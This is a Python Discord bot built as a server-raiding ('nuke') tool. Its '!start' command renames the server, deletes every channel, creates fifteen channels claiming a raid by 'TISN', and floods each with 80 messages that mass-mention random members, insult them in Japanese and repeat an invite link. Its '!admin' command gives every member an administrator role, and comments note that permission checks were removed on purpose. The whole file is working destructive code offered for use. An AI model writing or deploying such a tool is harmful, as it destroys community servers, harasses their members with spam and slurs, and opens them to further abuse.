import discord
from discord.ext import commands
import os
import asyncio
import random

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
CHANNEL_COUNT = 15

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "        (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/4y3kfgr8p\n"
    "https://discord.gg/4y3kfgr8p\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
)


def random_mentions(guild: discord.Guild) -> str:
    members = [m for m in guild.members if not m.bot]
    if not members:
        return "@everyone\n"
    k = min(30, len(members))
    picked = random.choices(members, k=k)
    return " ".join(m.mention for m in picked) + "\n"


@bot.command()  # ← 権限チェック削除：誰でも実行可
async def start(ctx):
    guild = ctx.guild

    # ① サーバー名変更
    try:
        await guild.edit(name=SERVER_NAME)
    except:
        pass

    # ② 全チャンネル削除
    for ch in list(guild.channels):
        try:
            await ch.delete()
            await asyncio.sleep(0.25)
        except:
            pass

    # ③ 新規チャンネル作成
    new_channels = []
    for i in range(CHANNEL_COUNT):
        try:
            ch = await guild.create_text_channel(f"{CHANNEL_NAME}-{i+1}")
            new_channels.append(ch)
            await asyncio.sleep(0.35)
        except:
            pass

    # ④ メッセージ一斉送信
    for ch in new_channels:
        for _ in range(80):
            try:
                text = random_mentions(guild) + COMBINED_TEXT
                await ch.send(text)
                await asyncio.sleep(0.15)
            except:
                pass


@bot.command()  # ← 権限チェック削除：誰でも実行可
async def admin(ctx):
    guild = ctx.guild
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
        except:
            return

    for m in guild.members:
        if not m.bot and admin_role not in m.roles:
            try:
                await m.add_roles(admin_role)
                await asyncio.sleep(0.2)
            except:
                pass


@bot.event
async def on_ready():
    print(f"起動: {bot.user}")


TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("トークンを設定してください")

bot.run(TOKEN)